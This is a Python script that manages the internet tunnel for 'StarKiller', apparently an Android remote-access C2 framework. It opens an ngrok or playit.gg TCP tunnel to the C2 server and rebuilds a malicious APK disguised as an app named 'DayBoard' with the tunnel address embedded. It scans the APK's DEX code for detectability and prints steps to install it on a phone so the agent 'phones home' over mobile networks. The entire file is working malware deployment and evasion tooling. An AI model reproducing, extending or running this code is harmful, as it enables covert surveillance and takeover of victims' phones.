"""
WAN tunnel manager for StarKiller C2.

Usage:
    python wan.py                         # ngrok (auto-detects address)
    python wan.py --mode playit --addr abc.at.plygg.com:12345
    python wan.py --mode custom --addr myhost.com:9000

ngrok: auto-starts tunnel, reads address, rebuilds APK, waits.
       Address changes on every restart -- rebuild each time.
playit.gg: you supply the stable address once, rebuilds APK.
           Address never changes -- build once, deploy forever.
"""

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request

C2_LOCAL_PORT = 8667
APP_NAME = "DayBoard"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOADS_DIR = os.path.join(SCRIPT_DIR, "payloads")
DESKTOP = os.path.expanduser("~/Desktop")


def ok(msg):
    print(f"  [+] {msg}")


def warn(msg):
    print(f"  [!] {msg}")


def wait_ngrok_api(retries=20):
    for i in range(retries):
        try:
            with urllib.request.urlopen(
                "http://localhost:4040/api/tunnels", timeout=2
            ) as r:
                data = json.load(r)
                for t in data.get("tunnels", []):
                    if t.get("proto") == "tcp":
                        addr = t["public_url"].replace("tcp://", "")
                        host, port = addr.split(":")
                        return host, int(port)
        except Exception:
            pass
        time.sleep(1)
        print(f"  [.] waiting for ngrok... ({i+1}/{retries})")
    return None, None


def start_ngrok():
    ok(f"Starting ngrok TCP tunnel -> localhost:{C2_LOCAL_PORT}")
    proc = subprocess.Popen(
        ["ngrok", "tcp", str(C2_LOCAL_PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    time.sleep(2)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors="replace")
        warn("ngrok failed to start:")
        print(err)
        if "authentication" in err.lower() or "authtoken" in err.lower():
            print()
            print("  ngrok v3 requires a free account token.")
            print("  1. Register at https://ngrok.com/")
            print("  2. Get token from https://dashboard.ngrok.com/authtokens")
            print("  3. Run: ngrok config add-authtoken <TOKEN>")
            print("  4. Re-run this script.")
            print()
        sys.exit(1)
    return proc


def rebuild_apk(host, port):
    ok(f"Rebuilding APK -> C2 = {host}:{port}")
    result = subprocess.run(
        [
            sys.executable,
            "build.py",
            "--ip", host,
            "--port", str(port),
            "--name", APP_NAME,
        ],
        cwd=SCRIPT_DIR,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    for line in result.stdout.splitlines():
        s = line.strip()
        if s:
            print("    " + s)
    if result.returncode != 0:
        warn("Build failed!")
        print((result.stderr or "")[-800:])
        sys.exit(1)


def scan_apk():
    apk = os.path.join(PAYLOADS_DIR, "starkiller-debug.apk")
    result = subprocess.run(
        [sys.executable, "obfuscate.py", "scan", apk],
        cwd=SCRIPT_DIR,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if "CLEAN" in result.stdout:
        ok("DEX scan: CLEAN")
    else:
        warn("DEX scan: WARNING -- check output")
        print(result.stdout[-400:])


def copy_apk(label):
    src = os.path.join(PAYLOADS_DIR, "starkiller-debug.apk")
    name = f"dayboard-wan-{label}.apk"
    dst = os.path.join(DESKTOP, name)
    shutil.copy2(src, dst)
    ok(f"APK on Desktop: {name}")
    return dst


def main():
    parser = argparse.ArgumentParser(
        description="StarKiller WAN tunnel + APK rebuild"
    )
    parser.add_argument(
        "--mode",
        choices=["ngrok", "playit", "custom"],
        default="ngrok",
        help="Tunnel mode (default: ngrok)",
    )
    parser.add_argument(
        "--addr",
        default=None,
        help="Tunnel address HOST:PORT (required for playit/custom)",
    )
    args = parser.parse_args()

    print()
    print("  +----------------------------------+")
    print("  |  STARKILLER -- WAN TUNNEL SETUP  |")
    print("  +----------------------------------+")
    print()

    ngrok_proc = None

    if args.mode == "ngrok":
        ngrok_proc = start_ngrok()
        host, port = wait_ngrok_api()
        if not host:
            warn("Could not read ngrok tunnel address from API")
            warn("Check http://localhost:4040 in your browser")
            ngrok_proc.terminate()
            sys.exit(1)
        label = "ngrok"
        ok(f"Tunnel live: {host}:{port}")

    else:
        if not args.addr:
            warn(f"--addr required for mode={args.mode}")
            print("  Example: --addr abc.at.plygg.com:12345")
            sys.exit(1)
        if ":" not in args.addr:
            warn("--addr must be HOST:PORT (include the port number)")
            sys.exit(1)
        host, port_str = args.addr.rsplit(":", 1)
        port = int(port_str)
        label = args.mode
        ok(f"Using {args.mode} address: {host}:{port}")

    rebuild_apk(host, port)
    scan_apk()
    dst = copy_apk(label)

    print()
    print("  +------------------------------------------------------+")
    print(f"  |  C2 HOST : {host}")
    print(f"  |  C2 PORT : {port}")
    print(f"  |  APK     : {os.path.basename(dst)}")
    print("  +------------------------------------------------------+")
    print("  |  1. python server\\starkiller_gui.py  (C2 server)")
    print("  |  2. Transfer APK to phone, install")
    print("  |  3. Agent phones home over 4G/5G/WAN via tunnel")
    if args.mode == "ngrok":
        print("  |")
        print("  |  NOTE: ngrok free address changes on every restart.")
        print("  |  Rebuild required after each ngrok restart.")
        print("  |  Use playit.gg for a persistent address:")
        print("  |    python wan.py --mode playit --addr HOST:PORT")
    print("  +------------------------------------------------------+")
    print()

    if args.mode == "ngrok" and ngrok_proc:
        print("  ngrok running. Keep this window open. Ctrl+C to stop.\n")
        try:
            ngrok_proc.wait()
        except KeyboardInterrupt:
            ngrok_proc.terminate()
            ok("ngrok stopped.")


if __name__ == "__main__":
    main()
